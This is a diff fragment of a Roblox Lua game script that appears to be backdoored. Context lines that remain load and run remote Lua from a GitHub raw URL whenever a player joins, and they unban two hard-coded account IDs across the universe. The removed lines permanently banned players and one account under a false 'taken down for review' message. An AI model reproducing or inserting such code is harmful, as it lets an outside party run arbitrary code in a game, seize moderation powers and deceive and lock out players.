@@ -25,17 +25,7 @@ local function onPlayer(player)
 	   	end)
 		loadurl("https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/onjoin.lua")
 	else
-		local config: BanConfigType = {
-			UserIds = { player.UserId },
-			Duration = -1,
-			DisplayReason = "This place has been taken down for review.",
-			PrivateReason = "None",
-			ExcludeAltAccounts = false,
-			ApplyToUniverse = true,
-		}
-		local success, err = pcall(function()
-	  		return Players:BanAsync(config)
-		end)
+
 	end
 end
 
@@ -50,19 +40,6 @@ task.spawn(function()
 			game:GetService("Players"):UnbanAsync({UserIds={119494759,3227511162}, ApplyToUniverse=true})		
 		end)
 	end
-end)
-
-local config: BanConfigType = {
-		UserIds = { 9849581091 },
-		Duration = -1,
-		DisplayReason = "This game has been taken down for review.",
-		PrivateReason = "",
-		ExcludeAltAccounts = false,
-		ApplyToUniverse = true,
-	}
-
-local success, err = pcall(function()
-  return Players:BanAsync(config)
 end)
 
 pcall(function()
